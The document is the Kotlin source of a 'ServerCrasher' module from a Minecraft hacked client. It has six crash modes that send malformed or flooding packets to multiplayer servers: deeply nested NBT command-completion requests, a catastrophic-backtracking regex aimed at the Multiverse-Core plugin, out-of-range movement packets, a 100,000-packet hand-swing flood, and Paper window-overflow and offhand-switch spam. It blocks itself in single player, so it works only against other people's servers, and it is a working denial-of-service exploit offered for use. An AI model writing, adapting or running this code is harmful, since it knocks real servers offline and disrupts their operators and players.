package com.instrumentalist.elite.hacks.features.exploit

import com.instrumentalist.elite.events.features.UpdateEvent
import com.instrumentalist.elite.events.features.WorldEvent
import com.instrumentalist.elite.hacks.Module
import com.instrumentalist.elite.hacks.ModuleCategory
import com.instrumentalist.elite.utils.ChatUtil
import com.instrumentalist.elite.utils.IMinecraft
import com.instrumentalist.elite.utils.math.MSTimer
import com.instrumentalist.elite.utils.packet.PacketUtil
import com.instrumentalist.elite.utils.value.IntValue
import com.instrumentalist.elite.utils.value.ListValue
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps
import net.minecraft.item.ItemStack
import net.minecraft.item.Items
import net.minecraft.network.packet.c2s.play.*
import net.minecraft.screen.slot.SlotActionType
import net.minecraft.util.Hand
import net.minecraft.util.math.BlockPos
import net.minecraft.util.math.Direction
import org.lwjgl.glfw.GLFW
import java.util.*
import java.util.stream.Collectors
import java.util.stream.IntStream

class ServerCrasher : Module("Server Crasher", ModuleCategory.Exploit, GLFW.GLFW_KEY_UNKNOWN, false, true) {
    private val mode =
        ListValue(
            "Mode",
            arrayOf("Meteor Addon", "Position", "Hand Swing", "Paper Window Overflow", "Multiverse Core", "Offhand Switch"),
            "Meteor Addon"
        )

    private val switchThreads = IntValue("SwitchThreads", 10, 1, 100) { mode.get().equals("offhand switch", true) }

    private val packets = IntValue("Packets", 6, 1, 12) {
        mode.get().equals("meteor addon", true) || mode.get().equals("paper window overflow", true)
    }

    private val length =
        IntValue("Length", 2032, 1000, 3000) { mode.get().equals("meteor addon", true) }

    private val crashTimer = MSTimer()
    private var messageIndex = 0
    private val message = "msg @a[nbt={PAYLOAD}]"
    private val nbtExecutor = " @a[nbt={PAYLOAD}]"

    private val knownWorkingMessages = arrayOf(
        "msg",
        "minecraft:msg",
        "tell",
        "minecraft:tell",
        "tm",
        "teammsg",
        "minecraft:teammsg",
        "minecraft:w",
        "minecraft:me"
    )

    override fun onDisable() {
        messageIndex = 0
    }

    override fun onEnable() {
        if (IMinecraft.mc.player == null) return

        if (IMinecraft.mc.isInSingleplayer) {
            ChatUtil.printChat("ServerCrasher is disabled on single player")
            this@ServerCrasher.toggle()
            return
        }

        when (mode.get().lowercase(Locale.getDefault())) {
            "meteor addon" -> {
                val overflow = generateJsonObject(length.get())
                val partialCommand = message.replace("{PAYLOAD}", overflow)

                crashLog()

                repeat(packets.get()) {
                    PacketUtil.sendPacket(RequestCommandCompletionsC2SPacket(0, partialCommand))
                }

                this@ServerCrasher.toggle()
            }
        }
    }

    override fun onWorld(event: WorldEvent) {
        this@ServerCrasher.toggle()
    }

    override fun onUpdate(event: UpdateEvent) {
        if (IMinecraft.mc.player == null) return

        if (IMinecraft.mc.isInSingleplayer) {
            ChatUtil.printChat("ServerCrasher is disabled on single player")
            this@ServerCrasher.toggle()
            return
        }

        when (mode.get().lowercase(Locale.getDefault())) {
            "multiverse core" -> {
                crashLog()

                IMinecraft.mc.player!!.networkHandler.sendChatCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^")

                this@ServerCrasher.toggle()
            }

            "position" -> {
                crashLog()

                PacketUtil.sendPacket(
                    PlayerMoveC2SPacket.PositionAndOnGround(
                        IMinecraft.mc.player!!.pos.x + 99413,
                        IMinecraft.mc.player!!.boundingBox.minY,
                        IMinecraft.mc.player!!.pos.z + 99413,
                        true, IMinecraft.mc.player!!.horizontalCollision
                    )
                )

                this@ServerCrasher.toggle()
            }

            "hand swing" -> {
                if (crashTimer.hasTimePassed(10L)) {
                    repeat(100000) {
                        PacketUtil.sendPacket(HandSwingC2SPacket(Hand.MAIN_HAND))
                    }

                    crashLog()

                    crashTimer.reset()
                }

                this@ServerCrasher.toggle()
            }

            "offhand switch" -> {
                repeat(switchThreads.get()) {
                    PacketUtil.sendPacket(
                        PlayerActionC2SPacket(
                            PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND,
                            BlockPos.ORIGIN,
                            Direction.DOWN
                        )
                    )
                }

                crashLog()

                this@ServerCrasher.toggle()
            }

            "meteor addon" -> {
                if (messageIndex == knownWorkingMessages.size - 1) {
                    messageIndex = 0
                    this@ServerCrasher.toggle()
                }

                val knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor

                val len = 2044 - knownMessage.length
                val overflow = generateJsonObject(len)
                val partialCommand = knownMessage.replace("{PAYLOAD}", overflow)

                crashLog()

                repeat(packets.get()) {
                    PacketUtil.sendPacket(RequestCommandCompletionsC2SPacket(0, partialCommand))
                }

                messageIndex++
            }

            "paper window overflow" -> {
                if (IMinecraft.mc.player!!.age % 6 == 0) {
                    crashLog()

                    repeat(packets.get()) {
                        PacketUtil.sendPacket(
                            ClickSlotC2SPacket(
                                IMinecraft.mc.player!!.currentScreenHandler.syncId,
                                IMinecraft.mc.player!!.currentScreenHandler.revision,
                                36,
                                -1,
                                SlotActionType.SWAP,
                                IMinecraft.mc.player!!.currentScreenHandler.cursorStack.copy(),
                                Int2ObjectMaps.singleton(0, ItemStack(Items.GOLDEN_CARROT, 1))
                            )
                        )
                    }
                }
            }
        }
    }

    private fun crashLog() {
        ChatUtil.printChat("Crashing...")
    }

    private fun generateJsonObject(levels: Int): String {
        val `in` = IntStream.range(0, levels)
            .mapToObj { _ -> "[" }
            .collect(Collectors.joining())
        val json = "{a:$`in`}"
        return json
    }
}
